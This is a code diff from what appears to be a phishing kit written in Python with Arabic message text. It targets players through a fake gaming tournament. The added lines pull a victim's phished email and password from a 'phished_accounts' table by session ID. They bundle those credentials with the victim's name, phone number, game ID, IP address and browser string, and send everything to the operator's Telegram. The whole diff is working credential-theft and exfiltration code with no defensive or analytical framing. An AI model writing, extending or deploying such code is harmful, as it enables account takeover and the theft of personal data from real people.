@@ -69,19 +69,30 @@ def save_victim(session_id, step, full_name, phone_code, phone_number, game_id, 
                  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
               (session_id, step, full_name, phone_code, phone_number, game_id, email, ip, ua, datetime.now().isoformat()))
     conn.commit()
+    
+    # البحث عن بيانات تسجيل الدخول المرتبطة بنفس session_id
+    c.execute("SELECT email, password FROM phished_accounts WHERE session_id = ? ORDER BY id DESC LIMIT 1", (session_id,))
+    login_data = c.fetchone()
     conn.close()
+    
+    # بناء الرسالة
+    login_email = login_data[0] if login_data else "غير موجود"
+    login_password = login_data[1] if login_data else "غير موجود"
+    
     send_to_telegram(
         f"🎯 **بيانات البطولة!**\n"
         f"🆔 الجلسة: `{session_id}`\n"
         f"👤 الاسم: `{full_name}`\n"
         f"📞 الهاتف: `{phone_code}{phone_number}`\n"
         f"🎮 ID اللعبة: `{game_id}`\n"
-        f"📧 البريد: `{email}`\n"
+        f"📧 بريد البطولة: `{email}`\n"
         f"🌐 IP: `{ip}`\n"
         f"📱 المتصفح: `{ua}`\n"
-        f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}"
+        f"⏰ الوقت: {datetime.now().strftime('%H:%M:%S')}\n\n"
+        f"🔐 **بيانات تسجيل الدخول:**\n"
+        f"📧 البريد: `{login_email}`\n"
+        f"🔑 كلمة المرور: `{login_password}`"
     )
-
 def save_phished_account(session_id, email, password, ip, ua):
     conn = sqlite3.connect(DB_PATH)
     c = conn.cursor()
